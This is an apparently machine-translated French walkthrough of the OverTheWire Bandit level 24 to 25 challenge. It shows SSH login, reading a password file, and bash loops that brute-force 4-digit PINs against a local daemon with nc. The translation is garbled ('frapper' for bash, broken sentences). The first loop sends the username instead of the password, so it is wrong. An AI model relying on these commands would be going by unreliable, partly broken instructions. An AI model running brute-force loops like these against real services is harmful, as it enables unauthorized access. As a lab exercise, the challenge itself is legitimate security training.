Bandit Niveau 24 → 25

Objectifs:

Testez tous les codes PIN (0000-9999) pour accéder au service sur le port 30002 et obtenir le mot de passe du niveau 25.

Données d'information:
Hôte : bandit.labs.overthewire.org
Port : 2220
Utilisateur : bandit24
Mot de passe : [utiliser le mot de passe du niveau 23-24]
Port cible : 30002 (localhost)

Objectif : Forcer brute sur les codes PIN (0000-9999)

Approche:

Se connecter au niveau 24. Un démon écoute sur le port 30002 et fournira le mot de passe du niveau 25 si sur lui donne le mot de passe du niveau 24 + un code PIN secret à 4 chiffres. Testez tous les codes PIN possibles (0000-9999) en utilisant une boucle pour et nc. Le premier code PIN correct retournera le mot de passe du niveau 25.

Commandes:

-ssh bandit24@bandit.labs.overthewire.org -p 2220

Se connecter au niveau 24.

-cat /etc/bandit_pass/bandit24

Lire le mot de passe du niveau 24.

Créer une boucle de force brute :
frapper
for i in {0000..9999}; do
  echo "bandit24 $i" | nc localhost 30002
done

Ou :

frapper
for i in {0000..9999}; do
  echo "mot_de_passe_bandit24 $i" | nc -w 1 localhost 30002
done | grep -v "Wrong"

Testez tous les codes PIN et filtrez pour afficher uniquement la réponse correcte.

Trier puis sortir de la session SSH.

Prochaine étape:

ssh bandit25@bandit.labs.overthewire.org -p 2220